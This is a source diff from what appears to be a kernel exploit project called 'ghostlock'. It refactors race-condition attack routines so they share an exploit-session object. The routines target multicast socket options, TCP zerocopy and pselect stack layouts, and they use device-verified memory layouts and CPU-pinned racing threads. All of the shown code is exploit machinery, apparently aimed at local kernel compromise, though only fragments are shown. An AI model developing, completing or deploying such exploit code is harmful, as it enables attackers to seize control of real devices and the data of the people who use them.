@@ -5,6 +5,7 @@
 #include <sys/timerfd.h>
 
 #include "target.h"
+#include "session/exploit_session.hpp"
 
 /* The two Multicast stamp buffers intentionally remain dynamic stack frames.
  * Their layout/order is device-verified and must not become heap-backed STL. */
@@ -127,7 +128,7 @@ int kernel5_resident_start(void) {
             target_profile_multicast_waiter_layout(&g_target_profile);
     const struct execution_settings *execution = execution_settings();
     multicast_waiter_route_context_init(
-            context, &g_pi_race_context, NULL, execution, layout, 1);
+            context, &ghostlock::g_exploit_session.race, NULL, execution, layout, 1);
     context->main_cpu = runtime_config_snapshot().main_cpu;
     context->consumer_cpu = runtime_config_snapshot().consumer_cpu;
     uintptr_t bss = resolved_addresses_data_alias(
@@ -270,27 +271,27 @@ RouteStatus do_kernel5_fake_lock_route(const WriteRequest *request) {
         status.code = ROUTE_FALLBACK_SAFE;
         return status;
     }
-    atomic_store(&g_pi_race_context.consumer_calls, 0);
-    atomic_store(&g_pi_race_context.consumer_success, 0);
-    atomic_store(&g_pi_race_context.consumer_stop, 0);
-    atomic_store(&g_pi_race_context.route_delay_usec, 0);
+    atomic_store(&ghostlock::g_exploit_session.race.consumer_calls, 0);
+    atomic_store(&ghostlock::g_exploit_session.race.consumer_success, 0);
+    atomic_store(&ghostlock::g_exploit_session.race.consumer_stop, 0);
+    atomic_store(&ghostlock::g_exploit_session.race.route_delay_usec, 0);
     errno = 0;
     int stamp_result =
             setsockopt(fd, IPPROTO_IP, MCAST_BLOCK_SOURCE, stamp, sizeof(stamp));
     status.step = 61;
     status.error_number = errno;
-    atomic_store(&g_pi_race_context.consumer_go, 1);
+    atomic_store(&ghostlock::g_exploit_session.race.consumer_go, 1);
     for (int spin = 0; spin < 100000000 &&
-            atomic_load(&g_pi_race_context.consumer_calls) == 0; spin++)
+            atomic_load(&ghostlock::g_exploit_session.race.consumer_calls) == 0; spin++)
         __asm__ volatile("yield":: : "memory");
-    atomic_store(&g_pi_race_context.consumer_go, 0);
-    while (atomic_load(&g_pi_race_context.consumer_inflight))
+    atomic_store(&ghostlock::g_exploit_session.race.consumer_go, 0);
+    while (atomic_load(&ghostlock::g_exploit_session.race.consumer_inflight))
         __asm__ volatile("yield":: : "memory");
     close(fd);
     status.userspace_clean = 1;
     status.kernel_disarmed = 1;
     if (stamp_result == 0 ||
-            atomic_load(&g_pi_race_context.consumer_success) > 0) {
+            atomic_load(&ghostlock::g_exploit_session.race.consumer_success) > 0) {
         status.step = 0;
         status.error_number = 0;
         status.code = ROUTE_OK;
@@ -533,7 +534,7 @@ RouteStatus ghostlock::TcpZerocopyRoute::execute() noexcept {
  * common route dispatcher remains scheduled for S14. */
 RouteStatus do_tcp_fake_lock_route(const WriteRequest *request) {
     TcpZerocopyRouteContext context(
-            &g_pi_race_context, request, execution_settings(),
+            &ghostlock::g_exploit_session.race, request, execution_settings(),
             TCP_PUNCH_SHMEM_LEN);
     if (context.prepare() == 0) {
         (void) context.execute();
@@ -865,7 +866,7 @@ RouteStatus do_pselect_fake_lock_route(const WriteRequest *request) {
      * Keep this route invocation single-shot until ExploitSession can create a
      * fresh context per attempt; timeout/delay remain profile-owned meanwhile. */
     SelectStackRouteContext context(
-            &g_pi_race_context, request, execution_settings(),
+            &ghostlock::g_exploit_session.race, request, execution_settings(),
             target_profile_select_stack_layout(&g_target_profile),
             standard_io_backup);
     if (context.prepare() == 0) {
